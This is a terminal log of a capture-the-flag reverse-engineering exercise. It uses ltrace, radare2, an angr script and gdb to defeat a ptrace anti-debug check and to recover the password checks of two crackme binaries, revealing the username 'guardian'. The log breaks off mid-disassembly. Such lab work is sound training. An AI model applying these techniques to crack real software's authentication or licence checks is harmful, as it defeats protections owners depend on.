```
└─$ ltrace ./angel_A 
ptrace(0, 0, 1, 0)                                      = -1
printf("Using debuggers? Here is tutoria"...)           = -1
exit(1Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n <no return ...>
+++ exited (status 1) +++
                                                                                            
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ ltrace ./angel_B
Couldn't find .dynsym or .dynstr in "/proc/69415/exe"
                                                                                            
 
Say the magic word >>                                                                       
                                                                                            
You are not worthy of heaven!                                                               
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ r2 -d -A angel_A  
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7ff654897050]> afl
0x55c9c8dd3090    1 43           entry0
0x55c9c8dd5fe0    5 4124 -> 4126 reloc.__libc_start_main
0x55c9c8dd30c0    4 41   -> 34   sym.deregister_tm_clones
0x55c9c8dd30f0    4 57   -> 51   sym.register_tm_clones
0x55c9c8dd3130    5 57   -> 50   sym.__do_global_dtors_aux
0x55c9c8dd3080    1 6            sym.imp.__cxa_finalize
0x55c9c8dd3170    1 5            entry.init0
0x55c9c8dd3000    3 23           sym._init
0x55c9c8dd32c0    1 1            sym.__libc_csu_fini
0x55c9c8dd32c4    1 9            sym._fini
0x55c9c8dd3260    4 93           sym.__libc_csu_init
0x55c9c8dd3175    8 225          main
0x55c9c8dd3030    1 6            sym.imp.puts
0x55c9c8dd3040    1 6            sym.imp.printf
0x55c9c8dd2000    3 348  -> 337  loc.imp._ITM_deregisterTMCloneTable
0x55c9c8dd3050    1 6            sym.imp.fgets
0x55c9c8dd3060    1 6            sym.imp.ptrace
0x55c9c8dd3070    1 6            sym.imp.exit
[0x7ff654897050]> pdf
p: Cannot find function at 0x7ff654897050
[0x7ff654897050]> pdf @sym.main
            ; DATA XREF from entry0 @ 0x55c9c8dd30ad
┌ 225: int main (int argc, char **argv);
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_dh @ rbp-0xd
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x55c9c8dd3175      55             push rbp
│           0x55c9c8dd3176      4889e5         mov rbp, rsp
│           0x55c9c8dd3179      4883ec20       sub rsp, 0x20
│           0x55c9c8dd317d      897dec         mov dword [var_14h], edi ; argc
│           0x55c9c8dd3180      488975e0       mov qword [var_20h], rsi ; argv
│           0x55c9c8dd3184      b900000000     mov ecx, 0
│           0x55c9c8dd3189      ba01000000     mov edx, 1
│           0x55c9c8dd318e      be00000000     mov esi, 0
│           0x55c9c8dd3193      bf00000000     mov edi, 0
│           0x55c9c8dd3198      b800000000     mov eax, 0
│           0x55c9c8dd319d      e8befeffff     call sym.imp.ptrace     ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)                                         
│           0x55c9c8dd31a2      4883f8ff       cmp rax, 0xffffffffffffffff
│       ┌─< 0x55c9c8dd31a6      751b           jne 0x55c9c8dd31c3
│       │   0x55c9c8dd31a8      488d3d590e00.  lea rdi, str.Using_debuggers__Here_is_tutorial_https:__www.youtube.com_watch_vdQw4w9WgXcQ_n_22 ; 0x55c9c8dd4008 ; "Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22"                               
│       │   0x55c9c8dd31af      b800000000     mov eax, 0
│       │   0x55c9c8dd31b4      e887feffff     call sym.imp.printf     ; int printf(const char *format)                                                                                 
│       │   0x55c9c8dd31b9      bf01000000     mov edi, 1
│       │   0x55c9c8dd31be      e8adfeffff     call sym.imp.exit
│       └─> 0x55c9c8dd31c3      488d3d910e00.  lea rdi, str.e_36m_nSay_my_username____e_0m ; 0x55c9c8dd405b                                                                             
│           0x55c9c8dd31ca      b800000000     mov eax, 0
│           0x55c9c8dd31cf      e86cfeffff     call sym.imp.printf     ; int printf(const char *format)                                                                                 
│           0x55c9c8dd31d4      488b15a52e00.  mov rdx, qword [reloc.stdin] ; [0x55c9c8dd6080:8]=0                                                                                      
│           0x55c9c8dd31db      488d45f3       lea rax, [var_dh]
│           0x55c9c8dd31df      be09000000     mov esi, 9
│           0x55c9c8dd31e4      4889c7         mov rdi, rax
│           0x55c9c8dd31e7      e864feffff     call sym.imp.fgets      ; char *fgets(char *s, int size, FILE *stream)                                                                   
│           0x55c9c8dd31ec      c745fc000000.  mov dword [var_4h], 0
│       ┌─< 0x55c9c8dd31f3      eb48           jmp 0x55c9c8dd323d
│      ┌──> 0x55c9c8dd31f5      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x55c9c8dd31f8      4898           cdqe
│      ╎│   0x55c9c8dd31fa      488d14850000.  lea rdx, [rax*4]
│      ╎│   0x55c9c8dd3202      488d05572e00.  lea rax, obj.username   ; 0x55c9c8dd6060 ; U"kym~humr"                                                                                   
│      ╎│   0x55c9c8dd3209      8b1402         mov edx, dword [rdx + rax]
│      ╎│   0x55c9c8dd320c      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x55c9c8dd320f      4898           cdqe
│      ╎│   0x55c9c8dd3211      0fb64405f3     movzx eax, byte [rbp + rax - 0xd]
│      ╎│   0x55c9c8dd3216      83f004         xor eax, 4
│      ╎│   0x55c9c8dd3219      0fbec0         movsx eax, al
│      ╎│   0x55c9c8dd321c      83c008         add eax, 8
│      ╎│   0x55c9c8dd321f      39c2           cmp edx, eax
│     ┌───< 0x55c9c8dd3221      7416           je 0x55c9c8dd3239
│     │╎│   0x55c9c8dd3223      488d3d560e00.  lea rdi, str.e_31m_nThat_is_not_my_username_e_0m ; 0x55c9c8dd4080                                                                        
│     │╎│   0x55c9c8dd322a      e801feffff     call sym.imp.puts       ; int puts(const char *s)                                                                                        
│     │╎│   0x55c9c8dd322f      bf00000000     mov edi, 0
│     │╎│   0x55c9c8dd3234      e837feffff     call sym.imp.exit
│     └───> 0x55c9c8dd3239      8345fc01       add dword [var_4h], 1
│      ╎│   ; CODE XREF from main @ 0x55c9c8dd31f3
│      ╎└─> 0x55c9c8dd323d      837dfc07       cmp dword [var_4h], 7
│      └──< 0x55c9c8dd3241      7eb2           jle 0x55c9c8dd31f5
│           0x55c9c8dd3243      488d3d5e0e00.  lea rdi, str.e_32m_nCorrect__That_is_my_name_e_0m ; 0x55c9c8dd40a8                                                                       
│           0x55c9c8dd324a      e8e1fdffff     call sym.imp.puts       ; int puts(const char *s)                                                                                        
│           0x55c9c8dd324f      b800000000     mov eax, 0
│           0x55c9c8dd3254      c9             leave
└           0x55c9c8dd3255      c3             ret
[0x7ff654897050]> px @ 0x55c9c8dd6060
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x55c9c8dd6060  6b00 0000 7900 0000 6d00 0000 7e00 0000  k...y...m...~...                   
0x55c9c8dd6070  6800 0000 7500 0000 6d00 0000 7200 0000  h...u...m...r...
0x55c9c8dd6080  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6090  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd60a0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd60b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd60c0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd60d0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd60e0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd60f0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6100  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6110  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6120  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6130  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6140  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x55c9c8dd6150  0000 0000 0000 0000 0000 0000 0000 0000  ................
[0x7ff654897050]> 


or using ***angr***
──(kali㉿kali)-[~/Downloads/BinaryHeaven/angr]
└─$ ls
bin  include  lib  lib64  pyvenv.cfg
                                                                                            
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven/angr]
└─$ cd ..                           
                                                                                            
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ source angr/bin                 
                                                                                            
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ ls
angel_A  angel_B  angr  user.py
                                                                                            
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ source angr/bin/activate
                                                                                            
┌──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ python -m pip install angr
Collecting angr
  Using cached angr-9.2.12-py3-none-manylinux2014_x86_64.whl (2.7 MB)
Collecting itanium-demangler
  Using cached itanium_demangler-1.0-py3-none-any.whl
Collecting pyvex==9.2.12
  Using cached pyvex-9.2.12-py3-none-manylinux2014_x86_64.whl (3.0 MB)
Collecting CppHeaderParser
  Using cached CppHeaderParser-2.7.4-py3-none-any.whl
Collecting cffi>=1.14.0
  Downloading cffi-1.15.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (441 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 441.8/441.8 KB 7.1 MB/s eta 0:00:00
Collecting psutil
  Using cached psutil-5.9.1-cp310-cp310-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (282 kB)
Collecting mulpyplexer
  Using cached mulpyplexer-0.9-py3-none-any.whl
Collecting networkx!=2.8.1,>=2.0
  Downloading networkx-2.8.5-py3-none-any.whl (2.0 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.0/2.0 MB 15.4 MB/s eta 0:00:00
Collecting claripy==9.2.12
  Using cached claripy-9.2.12-py3-none-any.whl (153 kB)
Collecting rpyc
  Using cached rpyc-5.2.1-py3-none-any.whl (68 kB)
Collecting ailment==9.2.12
  Using cached ailment-9.2.12-py3-none-any.whl (21 kB)
Collecting cachetools
  Using cached cachetools-5.2.0-py3-none-any.whl (9.3 kB)
Collecting pycparser>=2.18
  Downloading pycparser-2.21-py2.py3-none-any.whl (118 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 118.7/118.7 KB 16.2 MB/s eta 0:00:00
Collecting progressbar2>=3
  Using cached progressbar2-4.0.0-py2.py3-none-any.whl (26 kB)
Collecting GitPython
  Downloading GitPython-3.1.27-py3-none-any.whl (181 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 181.2/181.2 KB 26.0 MB/s eta 0:00:00
Collecting sympy
  Downloading sympy-1.10.1-py3-none-any.whl (6.4 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 6.4/6.4 MB 16.5 MB/s eta 0:00:00
Collecting cle==9.2.12
  Using cached cle-9.2.12-py3-none-any.whl (161 kB)
Collecting sortedcontainers
  Downloading sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)
Collecting archinfo==9.2.12
  Using cached archinfo-9.2.12-py3-none-any.whl (57 kB)
Collecting capstone!=5.0.0rc2,>=3.0.5rc2
  Using cached capstone-4.0.2-py2.py3-none-manylinux1_x86_64.whl (2.1 MB)
Collecting unicorn==1.0.2rc4
  Using cached unicorn-1.0.2rc4-py2.py3-none-manylinux1_x86_64.whl (8.1 MB)
Collecting dpkt
  Using cached dpkt-1.9.7.2-py3-none-any.whl (181 kB)
Collecting nampa
  Using cached nampa-0.1.1-py2.py3-none-any.whl (9.2 kB)
Collecting protobuf>=3.19.0
  Using cached protobuf-4.21.4-cp37-abi3-manylinux2014_x86_64.whl (408 kB)
Collecting z3-solver>=4.8.5.0
  Using cached z3_solver-4.10.2.0-py2.py3-none-manylinux1_x86_64.whl (52.9 MB)
Collecting decorator
  Downloading decorator-5.1.1-py3-none-any.whl (9.1 kB)
Collecting pysmt>=0.9.1.dev119
  Using cached PySMT-0.9.6.dev21-py2.py3-none-any.whl (319 kB)
Collecting pyelftools>=0.27
  Using cached pyelftools-0.28-py2.py3-none-any.whl (155 kB)
Collecting pefile
  Downloading pefile-2022.5.30.tar.gz (72 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 72.9/72.9 KB 11.8 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Collecting bitstring
  Using cached bitstring-3.1.9-py3-none-any.whl (38 kB)
Collecting python-utils>=3.0.0
  Using cached python_utils-3.3.3-py2.py3-none-any.whl (23 kB)
Collecting ply
  Downloading ply-3.11-py2.py3-none-any.whl (49 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 49.6/49.6 KB 4.2 MB/s eta 0:00:00
Collecting gitdb<5,>=4.0.1
  Downloading gitdb-4.0.9-py3-none-any.whl (63 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 63.1/63.1 KB 11.9 MB/s eta 0:00:00
Collecting future
  Downloading future-0.18.2.tar.gz (829 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 829.2/829.2 KB 32.3 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Collecting plumbum
  Using cached plumbum-1.7.2-py2.py3-none-any.whl (117 kB)
Collecting mpmath>=0.19
  Downloading mpmath-1.2.1-py3-none-any.whl (532 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 532.6/532.6 KB 25.5 MB/s eta 0:00:00
Collecting smmap<6,>=3.0.1
  Downloading smmap-5.0.0-py3-none-any.whl (24 kB)
Using legacy 'setup.py install' for future, since package 'wheel' is not installed.
Using legacy 'setup.py install' for pefile, since package 'wheel' is not installed.
Installing collected packages: z3-solver, unicorn, sortedcontainers, pysmt, pyelftools, ply, mulpyplexer, mpmath, itanium-demangler, dpkt, bitstring, sympy, smmap, python-utils, pycparser, psutil, protobuf, plumbum, networkx, future, decorator, CppHeaderParser, capstone, cachetools, archinfo, ailment, rpyc, progressbar2, pefile, nampa, gitdb, claripy, cffi, pyvex, GitPython, cle, angr
  Running setup.py install for future ... done
  Running setup.py install for pefile ... done
Successfully installed CppHeaderParser-2.7.4 GitPython-3.1.27 ailment-9.2.12 angr-9.2.12 archinfo-9.2.12 bitstring-3.1.9 cachetools-5.2.0 capstone-4.0.2 cffi-1.15.1 claripy-9.2.12 cle-9.2.12 decorator-5.1.1 dpkt-1.9.7.2 future-0.18.2 gitdb-4.0.9 itanium-demangler-1.0 mpmath-1.2.1 mulpyplexer-0.9 nampa-0.1.1 networkx-2.8.5 pefile-2022.5.30 plumbum-1.7.2 ply-3.11 progressbar2-4.0.0 protobuf-4.21.4 psutil-5.9.1 pycparser-2.21 pyelftools-0.28 pysmt-0.9.6.dev21 python-utils-3.3.3 pyvex-9.2.12 rpyc-5.2.1 smmap-5.0.0 sortedcontainers-2.4.0 sympy-1.10.1 unicorn-1.0.2rc4 z3-solver-4.10.2.0
                                                                                            
┌──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ python3 user.py           
WARNING | 2022-08-03 17:20:52,728 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.                              
WARNING | 2022-08-03 17:20:55,143 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory with an unspecified value. This could indicate unwanted behavior. 
WARNING | 2022-08-03 17:20:55,144 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:                                                                            
WARNING | 2022-08-03 17:20:55,144 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state                                                           
WARNING | 2022-08-03 17:20:55,145 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null                                                                                      
WARNING | 2022-08-03 17:20:55,145 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.                                                                                          
WARNING | 2022-08-03 17:20:55,145 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff8c with 4 unconstrained bytes referenced from 0x401095 (_start+0x5 in angel_A (0x1095))                                                                      
b''
b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x00'
b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x00'
b'g\x00\x00\x00\x00\x00\x00\x00'
b'g\x00\x00\x00\x00\x00\x00\x00'
b'gu\x00\x00\x00\x00\x00\x00'
b'gu\x84\x00\x00\x00\x00\x00'
b'gua\x00\x00\x00\x00\x00'
b'gua\x84\x00\x00\x00\x00'
b'guar\x00\x00\x00\x00'
b'guar\x00\x00\x00\x00'
b'guard\x00\x00\x00'
b'guard\x00\x00\x00'
b'guardi\x00\x00'
b'guardi\x84\x00'
b'guardian'
b'guardia\x00'
b'guardian'
b'guardia\x00'

└─$ cat user.py    
import angr
import sys

def main(argv):
  b = "./angel_A"
  p = angr.Project(b)
  init = p.factory.entry_state()
  sm = p.factory.simgr(init)
  sm.explore()
  for state in sm.deadended:
     print(state.posix.dumps(sys.stdin.fileno()))

if __name__ == '__main__':
  main(sys.argv)


What is the username? guardian

──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ gdb angel_B
GNU gdb (Debian 12.1-3) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

--Type <RET> for more, q to quit, c to continue without paging--c
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from angel_B...
warning: Missing auto-load script at offset 0 in section .debug_gdb_scripts
of file /home/kali/Downloads/BinaryHeaven/angel_B.
Use `info auto-load python-scripts [REGEXP]' to list them.
(gdb) break main.main
Breakpoint 1 at 0x4a52c0: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 3.
(gdb) run
Starting program: /home/kali/Downloads/BinaryHeaven/angel_B 
[New LWP 97304]
[New LWP 97305]
[New LWP 97306]
[New LWP 97307]

Thread 1 "angel_B" hit Breakpoint 1, main.main () at /mnt/c/Users/User/Downloads/binary_heaven/password.go:3                                                                            
3       /mnt/c/Users/User/Downloads/binary_heaven/password.go: No such file or directory.
(gdb) disass main.main
Dump of assembler code for function main.main:
=> 0x00000000004a52c0 <+0>:     mov    %fs:0xfffffffffffffff8,%rcx
   0x00000000004a52c9 <+9>:     lea    -0x40(%rsp),%rax
   0x00000000004a52ce <+14>:    cmp    0x10(%rcx),%rax
   0x00000000004a52d2 <+18>:    jbe    0x4a5560 <main.main+672>
   0x00000000004a52d8 <+24>:    sub    $0xc0,%rsp
   0x00000000004a52df <+31>:    mov    %rbp,0xb8(%rsp)
   0x00000000004a52e7 <+39>:    lea    0xb8(%rsp),%rbp
   0x00000000004a52ef <+47>:    lea    0x24cce(%rip),%rax        # 0x4c9fc4
   0x00000000004a52f6 <+54>:    mov    %rax,(%rsp)
   0x00000000004a52fa <+58>:    movq   $0x5,0x8(%rsp)
   0x00000000004a5303 <+67>:    call   0x40a120 <runtime.convTstring>
   0x00000000004a5308 <+72>:    mov    0x10(%rsp),%rax
--Type <RET> for more, q to quit, c to continue without paging--c
   0x00000000004a530d <+77>:    xorps  %xmm0,%xmm0
   0x00000000004a5310 <+80>:    movups %xmm0,0x98(%rsp)
   0x00000000004a5318 <+88>:    movups %xmm0,0xa8(%rsp)
   0x00000000004a5320 <+96>:    lea    0xbb99(%rip),%rcx        # 0x4b0ec0
   0x00000000004a5327 <+103>:   mov    %rcx,0x98(%rsp)
   0x00000000004a532f <+111>:   mov    %rax,0xa0(%rsp)
   0x00000000004a5337 <+119>:   mov    %rcx,0xa8(%rsp)
   0x00000000004a533f <+127>:   lea    0x441ea(%rip),%rax        # 0x4e9530
   0x00000000004a5346 <+134>:   mov    %rax,0xb0(%rsp)
   0x00000000004a534e <+142>:   mov    0xc395b(%rip),%rax        # 0x568cb0 <os.Stdout>
   0x00000000004a5355 <+149>:   lea    0x45a04(%rip),%rdx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
   0x00000000004a535c <+156>:   mov    %rdx,(%rsp)
   0x00000000004a5360 <+160>:   mov    %rax,0x8(%rsp)
   0x00000000004a5365 <+165>:   lea    0x98(%rsp),%rax
   0x00000000004a536d <+173>:   mov    %rax,0x10(%rsp)
   0x00000000004a5372 <+178>:   movq   $0x2,0x18(%rsp)
   0x00000000004a537b <+187>:   movq   $0x2,0x20(%rsp)
   0x00000000004a5384 <+196>:   call   0x499620 <fmt.Fprintln>
   0x00000000004a5389 <+201>:   lea    0xbb30(%rip),%rax        # 0x4b0ec0
   0x00000000004a5390 <+208>:   mov    %rax,(%rsp)
   0x00000000004a5394 <+212>:   call   0x40cde0 <runtime.newobject>
   0x00000000004a5399 <+217>:   mov    0x8(%rsp),%rax
   0x00000000004a539e <+222>:   mov    %rax,0x40(%rsp)
   0x00000000004a53a3 <+227>:   xorps  %xmm0,%xmm0
   0x00000000004a53a6 <+230>:   movups %xmm0,0x48(%rsp)
   0x00000000004a53ab <+235>:   lea    0x95ee(%rip),%rcx        # 0x4ae9a0
   0x00000000004a53b2 <+242>:   mov    %rcx,0x48(%rsp)
   0x00000000004a53b7 <+247>:   mov    %rax,0x50(%rsp)
   0x00000000004a53bc <+252>:   mov    0xc38e5(%rip),%rcx        # 0x568ca8 <os.Stdin>
   0x00000000004a53c3 <+259>:   lea    0x45976(%rip),%rdx        # 0x4ead40 <go.itab.*os.File,io.Reader>                                                                                
   0x00000000004a53ca <+266>:   mov    %rdx,(%rsp)
   0x00000000004a53ce <+270>:   mov    %rcx,0x8(%rsp)
   0x00000000004a53d3 <+275>:   lea    0x48(%rsp),%rcx
   0x00000000004a53d8 <+280>:   mov    %rcx,0x10(%rsp)
   0x00000000004a53dd <+285>:   movq   $0x1,0x18(%rsp)
   0x00000000004a53e6 <+294>:   movq   $0x1,0x20(%rsp)
   0x00000000004a53ef <+303>:   call   0x49f8c0 <fmt.Fscanln>
   0x00000000004a53f4 <+308>:   mov    0x40(%rsp),%rax
   0x00000000004a53f9 <+313>:   mov    0x8(%rax),%rcx
   0x00000000004a53fd <+317>:   mov    (%rax),%rax
   0x00000000004a5400 <+320>:   cmp    $0xb,%rcx
   0x00000000004a5404 <+324>:   je     0x4a54a1 <main.main+481>
   0x00000000004a540a <+330>:   lea    0x24ba9(%rip),%rax        # 0x4c9fba
   0x00000000004a5411 <+337>:   mov    %rax,(%rsp)
   0x00000000004a5415 <+341>:   movq   $0x5,0x8(%rsp)
   0x00000000004a541e <+350>:   xchg   %ax,%ax
   0x00000000004a5420 <+352>:   call   0x40a120 <runtime.convTstring>
   0x00000000004a5425 <+357>:   mov    0x10(%rsp),%rax
   0x00000000004a542a <+362>:   xorps  %xmm0,%xmm0
   0x00000000004a542d <+365>:   movups %xmm0,0x58(%rsp)
   0x00000000004a5432 <+370>:   movups %xmm0,0x68(%rsp)
   0x00000000004a5437 <+375>:   lea    0xba82(%rip),%rcx        # 0x4b0ec0
   0x00000000004a543e <+382>:   mov    %rcx,0x58(%rsp)
   0x00000000004a5443 <+387>:   mov    %rax,0x60(%rsp)
   0x00000000004a5448 <+392>:   mov    %rcx,0x68(%rsp)
   0x00000000004a544d <+397>:   lea    0x440fc(%rip),%rax        # 0x4e9550
   0x00000000004a5454 <+404>:   mov    %rax,0x70(%rsp)
   0x00000000004a5459 <+409>:   mov    0xc3850(%rip),%rax        # 0x568cb0 <os.Stdout>
   0x00000000004a5460 <+416>:   lea    0x458f9(%rip),%rcx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
   0x00000000004a5467 <+423>:   mov    %rcx,(%rsp)
   0x00000000004a546b <+427>:   mov    %rax,0x8(%rsp)
   0x00000000004a5470 <+432>:   lea    0x58(%rsp),%rax
   0x00000000004a5475 <+437>:   mov    %rax,0x10(%rsp)
   0x00000000004a547a <+442>:   movq   $0x2,0x18(%rsp)
   0x00000000004a5483 <+451>:   movq   $0x2,0x20(%rsp)
   0x00000000004a548c <+460>:   call   0x499620 <fmt.Fprintln>
   0x00000000004a5491 <+465>:   mov    0xb8(%rsp),%rbp
   0x00000000004a5499 <+473>:   add    $0xc0,%rsp
   0x00000000004a54a0 <+480>:   ret    
   0x00000000004a54a1 <+481>:   mov    %rax,(%rsp)
   0x00000000004a54a5 <+485>:   lea    0x2585f(%rip),%rax        # 0x4cad0b
   0x00000000004a54ac <+492>:   mov    %rax,0x8(%rsp)
   0x00000000004a54b1 <+497>:   mov    %rcx,0x10(%rsp)
   0x00000000004a54b6 <+502>:   call   0x4022e0 <runtime.memequal>
   0x00000000004a54bb <+507>:   cmpb   $0x0,0x18(%rsp)
   0x00000000004a54c0 <+512>:   je     0x4a540a <main.main+330>
   0x00000000004a54c6 <+518>:   lea    0x24af2(%rip),%rax        # 0x4c9fbf
   0x00000000004a54cd <+525>:   mov    %rax,(%rsp)
   0x00000000004a54d1 <+529>:   movq   $0x5,0x8(%rsp)
   0x00000000004a54da <+538>:   call   0x40a120 <runtime.convTstring>
   0x00000000004a54df <+543>:   mov    0x10(%rsp),%rax
   0x00000000004a54e4 <+548>:   xorps  %xmm0,%xmm0
   0x00000000004a54e7 <+551>:   movups %xmm0,0x78(%rsp)
   0x00000000004a54ec <+556>:   movups %xmm0,0x88(%rsp)
   0x00000000004a54f4 <+564>:   lea    0xb9c5(%rip),%rcx        # 0x4b0ec0
   0x00000000004a54fb <+571>:   mov    %rcx,0x78(%rsp)
   0x00000000004a5500 <+576>:   mov    %rax,0x80(%rsp)
   0x00000000004a5508 <+584>:   mov    %rcx,0x88(%rsp)
   0x00000000004a5510 <+592>:   lea    0x44029(%rip),%rax        # 0x4e9540
   0x00000000004a5517 <+599>:   mov    %rax,0x90(%rsp)
   0x00000000004a551f <+607>:   mov    0xc378a(%rip),%rax        # 0x568cb0 <os.Stdout>
   0x00000000004a5526 <+614>:   lea    0x45833(%rip),%rcx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
   0x00000000004a552d <+621>:   mov    %rcx,(%rsp)
   0x00000000004a5531 <+625>:   mov    %rax,0x8(%rsp)
   0x00000000004a5536 <+630>:   lea    0x78(%rsp),%rax
   0x00000000004a553b <+635>:   mov    %rax,0x10(%rsp)
   0x00000000004a5540 <+640>:   movq   $0x2,0x18(%rsp)
   0x00000000004a5549 <+649>:   movq   $0x2,0x20(%rsp)
   0x00000000004a5552 <+658>:   call   0x499620 <fmt.Fprintln>
   0x00000000004a5557 <+663>:   jmp    0x4a5491 <main.main+465>
   0x00000000004a555c <+668>:   nopl   0x0(%rax)
   0x00000000004a5560 <+672>:   call   0x461620 <runtime.morestack_noctxt>
   0x00000000004a5565 <+677>:   jmp    0x4a52c0 <main.main>
End of assembler dump.
(gdb) break *0x00000000004a54b6
Breakpoint 2 at 0x4a54b6: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 14.
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/BinaryHeaven/angel_B 
[New LWP 98432]
[New LWP 98433]
[New LWP 98434]
[New LWP 98435]

Thread 1 "angel_B" hit Breakpoint 1, main.main () at /mnt/c/Users/User/Downloads/binary_heaven/password.go:3                                                                            
3       in /mnt/c/Users/User/Downloads/binary_heaven/password.go
(gdb) disass main.main
Dump of assembler code for function main.main:
=> 0x00000000004a52c0 <+0>:     mov    %fs:0xfffffffffffffff8,%rcx
   0x00000000004a52c9 <+9>:     lea    -0x40(%rsp),%rax
   0x00000000004a52ce <+14>:    cmp    0x10(%rcx),%rax
   0x00000000004a52d2 <+18>:    jbe    0x4a5560 <main.main+672>
   0x00000000004a52d8 <+24>:    sub    $0xc0,%rsp
   0x00000000004a52df <+31>:    mov    %rbp,0xb8(%rsp)
   0x00000000004a52e7 <+39>:    lea    0xb8(%rsp),%rbp
   0x00000000004a52ef <+47>:    lea    0x24cce(%rip),%rax        # 0x4c9fc4
   0x00000000004a52f6 <+54>:    mov    %rax,(%rsp)
   0x00000000004a52fa <+58>:    movq   $0x5,0x8(%rsp)
   0x00000000004a5303 <+67>:    call   0x40a120 <runtime.convTstring>
   0x00000000004a5308 <+72>:    mov    0x10(%rsp),%rax
--Type <RET> for more, q to quit, c to continue without paging--c
   0x00000000004a530d <+77>:    xorps  %xmm0,%xmm0
   0x00000000004a5310 <+80>:    movups %xmm0,0x98(%rsp)
   0x00000000004a5318 <+88>:    movups %xmm0,0xa8(%rsp)
   0x00000000004a5320 <+96>:    lea    0xbb99(%rip),%rcx        # 0x4b0ec0
   0x00000000004a5327 <+103>:   mov    %rcx,0x98(%rsp)
   0x00000000004a532f <+111>:   mov    %rax,0xa0(%rsp)
